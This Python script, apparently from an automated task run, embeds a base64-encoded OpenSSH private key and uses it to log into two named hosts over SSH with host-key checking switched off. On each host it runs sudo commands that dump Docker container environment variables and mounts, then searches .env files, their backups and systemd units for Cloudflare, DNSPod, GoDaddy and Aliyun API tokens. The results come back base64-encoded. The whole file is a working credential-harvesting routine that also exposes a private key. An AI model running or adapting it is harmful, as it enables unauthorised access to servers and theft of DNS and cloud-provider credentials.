# -*- coding: utf-8 -*-
# intent 29610 round D: on aro81 (81.68.254.22) inspect the Lumii AI platform (lumii-ai-backend /
# lumii-ai-dashboard = ai-netauto?) containers incl. stopped ones, their full env, mounts and source
# dirs, and hunt the Cloudflare/DNSPod provider credentials (DOMAINS__CLOUDFLARE__APITOKEN etc).
import json, os, sys, base64, re, subprocess
from concurrent.futures import ThreadPoolExecutor
WORK="/tmp/p29610d"; os.makedirs(WORK,exist_ok=True)
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open(WORK+"/fleetkey","wb").write(base64.b64decode(KEYB64)); os.chmod(WORK+"/fleetkey",0o600)
def R(k,v,maxb=60000):
    s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    if len(s)>maxb: s=s[:maxb]+"...TRUNC(len=%d)"%len(s)
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
REMOTE=r'''
set +e
echo "@@@PSA"; sudo docker ps -a --format '{{.Names}}|{{.Image}}|{{.Status}}|{{.Ports}}' 2>/dev/null | grep -iE 'lumii-ai|netauto|ops|domain|router|dashboard' | head -30
echo "@@@INSPECT"
for c in $(sudo docker ps -aq 2>/dev/null); do n=$(sudo docker inspect -f '{{.Name}}' $c 2>/dev/null); case "$n" in *lumii-ai*|*netauto*|*ops*|*dashboard*) echo "##### $n"; sudo docker inspect -f 'IMAGE={{.Config.Image}} CREATED={{.Created}} CMD={{.Config.Cmd}} ENTRY={{.Config.Entrypoint}} WORKDIR={{.Config.WorkingDir}}' $c 2>/dev/null; echo "--ENV--"; sudo docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' $c 2>/dev/null; echo "--MOUNTS--"; sudo docker inspect -f '{{range .Mounts}}{{.Source}} -> {{.Destination}}{{println}}{{end}}' $c 2>/dev/null;; esac; done
echo "@@@SRCDIR"
for d in /opt/lumii-ai /opt/lumii-ai-backend /opt/ai-netauto /opt/netauto /data/lumii-ai /srv/lumii-ai /root/ai-netauto /home/*/ai-netauto /home/*/Lumii; do [ -d "$d" ] && { echo "## $d"; ls -la "$d" | head -25; }; done
echo "@@@FINDENV"
timeout 90 sudo find /opt /data /srv /root /home -maxdepth 5 -type d \( -name '*lumii-ai*' -o -name '*netauto*' \) 2>/dev/null | head -20
for f in $(timeout 90 sudo find /opt /data /srv /root /home -maxdepth 6 -type f \( -name '.env' -o -name '.env.*' -o -name '*.env' \) 2>/dev/null | grep -iE 'lumii-ai|netauto|ops|backend' | head -30); do echo "== $f"; timeout 15 sudo grep -aiE 'CLOUDFLARE|CF_API|CF_DNS|CF_TOKEN|DNSPOD|DOMAINS|GODADDY|ALIYUN|PROVIDER' "$f" 2>/dev/null | head -30; done
echo "@@@ENVBAKS"
for f in $(timeout 90 sudo find /opt /data /srv /root /home -maxdepth 7 -type f \( -name '.env.bak*' -o -name '.env.*bak*' -o -name '.env-*' -o -name '*.env.old' -o -name '.env.save' \) 2>/dev/null | head -40); do echo "== $f"; timeout 10 sudo grep -aiE 'CLOUDFLARE|CF_API|DNSPOD|DOMAINS|GODADDY|ALIYUN' "$f" 2>/dev/null | head -20; done
echo "@@@SYSD"
timeout 30 sudo grep -rilE 'lumii-ai|netauto|domainsync' /etc/systemd/system 2>/dev/null | head -10
for f in $(timeout 30 sudo grep -rilE 'lumii-ai|netauto|domainsync' /etc/systemd/system 2>/dev/null | head -8); do echo "== $f"; timeout 10 sudo cat "$f" | head -40; done
echo "@@@END"
'''
def do(h,l):
    a=["ssh","-i",WORK+"/fleetkey","-o","BatchMode=yes","-o","StrictHostKeyChecking=no",
       "-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=12","-o","IdentitiesOnly=yes","ubuntu@%s"%h,"sudo -n bash -s"]
    try: p=subprocess.run(a,input=REMOTE.encode(),capture_output=True,timeout=560); o=p.stdout.decode("utf-8","replace")
    except Exception as e: R("%s_meta"%l,{"host":h,"err":repr(e)}); return
    R("%s_meta"%l,{"host":h,"ok":"@@@END" in o,"outlen":len(o)})
    parts=re.split(r'@@@([A-Z0-9_]+)',o)
    for i in range(1,len(parts),2):
        sec=parts[i]; body=parts[i+1] if i+1<len(parts) else ""
        if body.strip(): R("%s_%s"%(l,sec.lower()), body[:40000])
if __name__=="__main__":
    with ThreadPoolExecutor(max_workers=2) as ex:
        for f in [ex.submit(do,h,l) for h,l in [("81.68.254.22","aro81"),("43.143.107.214","share-center")]]:
            try: f.result()
            except Exception as e: print("ERR",e,flush=True)
    print("ALLDONE",flush=True)
